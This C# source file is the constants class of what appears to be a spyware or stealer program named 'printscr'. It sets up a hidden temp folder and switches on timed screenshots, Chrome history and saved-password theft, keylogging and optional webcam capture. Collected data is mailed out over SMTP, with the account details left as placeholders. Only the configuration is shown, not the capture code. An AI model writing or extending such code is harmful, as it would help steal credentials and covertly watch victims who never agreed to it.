using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Text;
namespace printscr
{
    public static class Constants
    {
        public static string path = Path.GetTempPath() + @"Z9A307-CC32-4BB9-A5FE-B1738DEFD02E" + @"\2E0FADSDDDS33ED9D";
        public static string pathGizleAna = Path.GetTempPath() + @"Z9A307-CC32-4BB9-A5FE-B1738DEFD02E";
        public static bool webCameraPhoto = false;
        public static int webCameraPhotoTime = 720000000;
        public static bool ScreenShot = true;
        public static int ScreenShotTime = 900000;
        public static bool timer1Process = true;
        public static bool getChromeHistory = true;
        public static int getChromeHistoryTime = 7200000;
        public static bool getChromePasswords = true;
        public static int getChromePasswordsTime = 7200120;
        public static bool KeyActive = true;
        public static bool sendMail = true;
        #region Parameters
        public static int KeyTime = 20;
        public static int mailSendTime = 7200000;
        public static string saveScreenshot = "";
        #endregion
        #region MailParameters
        public static string host = @"smtp.live.com";
        public static int port = 465;
        public static string mail = @"mail@gmail.com";
        public static string password = @"xxxx";
        #endregion
    }
}
